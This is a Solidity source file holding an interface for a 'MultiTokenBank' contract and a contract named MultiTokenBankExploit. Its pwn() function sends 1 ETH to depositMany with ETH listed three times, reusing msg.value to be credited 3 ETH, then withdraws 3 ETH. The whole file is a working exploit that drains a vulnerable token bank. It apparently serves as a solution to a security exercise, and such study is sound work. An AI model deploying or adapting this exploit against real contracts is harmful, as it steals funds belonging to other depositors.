// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

// Interface for the MultiTokenBank contract.
interface IMultiTokenBank {
    // Function to get the balance of a specific token for a specific address.
    function balances(address, address) external view returns (uint);

    // Function to deposit multiple tokens with corresponding amounts.
    function depositMany(address[] calldata, uint[] calldata) external payable;

    // Function to deposit a specific token with a given amount.
    function deposit(address, uint) external payable;

    // Function to withdraw a specific token with a given amount.
    function withdraw(address, uint) external;
}

contract MultiTokenBankExploit {
    // Address representing ETH.
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    // Address of the target MultiTokenBank contract.
    IMultiTokenBank public bank;

    // Constructor to set the target MultiTokenBank contract address.
    constructor(address _bank) {
        bank = IMultiTokenBank(_bank);
    }

    // Fallback function to accept incoming ETH.
    receive() external payable {}

    // Function to perform the exploit.
    function pwn() external payable {
        // Create arrays to specify the tokens and amounts for deposit.
        address[] memory tokens = new address[](3);
        tokens[0] = ETH;
        tokens[1] = ETH;
        tokens[2] = ETH;
    
        uint[] memory amounts = new uint[](3);
        amounts[0] = 1e18;
        amounts[1] = 1e18;
        amounts[2] = 1e18;
    
        // Deposit ETH to the target MultiTokenBank contract using depositMany.
        // Send 1 ETH along with the deposit.
        bank.depositMany{value: 1e18}(tokens, amounts);
        
        // Withdraw 3 ETH from the target MultiTokenBank contract for the ETH token.
        bank.withdraw(ETH, 3 * 1e18);
    }
}